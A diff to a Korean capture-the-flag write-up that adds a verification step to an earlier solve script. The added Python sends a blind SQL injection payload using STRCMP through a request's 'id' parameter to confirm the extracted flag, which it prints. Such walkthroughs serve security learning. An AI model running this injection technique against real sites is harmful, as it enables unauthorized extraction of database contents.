@@ -563,6 +563,45 @@ print(f"\n[★] 최종 추출된 플래그: {flag}")
 
 [★] 최종 추출된 플래그: `flag{17fb5070e63305972aa14fdbb5ab4f8e}`
 
++) 26/07/24 13:01 추가
+
+기존의 payload-5.py에 전체 검증 로직이 누락됨을 확인함.
+
+전체 검증 로직 없이도 flag 제출에 성공하였지만, 안전하게 진행하고 싶은 분들은 payload-5.py 의 6번 하단에 아래의 코드를 덧붙여서 진행하시길
+
+```python
+
+# 7. 최종 flag 전체 문자열 검증
+print("\n[*] 3. 최종 플래그 전체 검증 중...")
+
+if len(flag) == flag_length:
+
+    payload = f"1' and !STRCMP(({target_query}), '{flag}') -- "
+
+    try:
+        response = requests.get(
+            url,
+            params={'id': payload},
+            cookies=cookies,
+            timeout=5
+        )
+
+        if success_marker in response.text:
+            print("[+] 최종 플래그 전체 검증 성공!")
+            print(f"\n[★] 최종 추출된 플래그: {flag}")
+        else:
+            print("[-] 최종 플래그 전체 검증 실패")
+            print(f"[-] 추출된 값: {flag}")
+
+    except requests.exceptions.RequestException as e:
+        print(f"[-] 전체 검증 요청 중 에러 발생: {e}")
+
+else:
+    print("[-] 플래그 길이가 올바르지 않아 전체 검증을 수행하지 않습니다.")
+    print(f"[-] 현재 길이: {len(flag)}")
+
+```
+
 # 종료!
 
 ![image.png](image%2024.png)
